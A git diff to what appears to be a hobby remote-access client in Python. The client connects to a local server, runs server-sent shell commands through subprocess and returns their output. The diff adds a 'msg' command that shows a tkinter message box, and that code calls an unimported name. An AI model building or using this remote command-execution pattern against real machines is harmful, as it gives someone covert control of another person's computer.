@@ -2,6 +2,7 @@ import socket
 import time
 import os
 import subprocess
+from tkinter import messagebox
 
 HOST_IP = "127.0.0.1"
 HOST_PORT = 3500
@@ -38,7 +39,9 @@ def shell_client():
 				print(resultat.stdout)
 				send(resultat.stdout)
          		
-
+def msg(data):
+	tkinter.messagebox.showinfo(title="Message", message=data)
+	send("Executed")
 
 # Connexion au serveur
 print(f"Connexion au serveur {HOST_IP}, port {HOST_PORT}")
@@ -55,6 +58,8 @@ while True:
 
 while True:
 	data = listen()
+	command_split = data.split(" ")
+
 	if not data:
 		break
 
@@ -62,6 +67,11 @@ while True:
  
 	if data == "shell":
 		shell_client()
+
+	if len(command_split) == 2 and command_split[0] == "msg":
+		msg(command_split[1])
+		
+
   
 
 
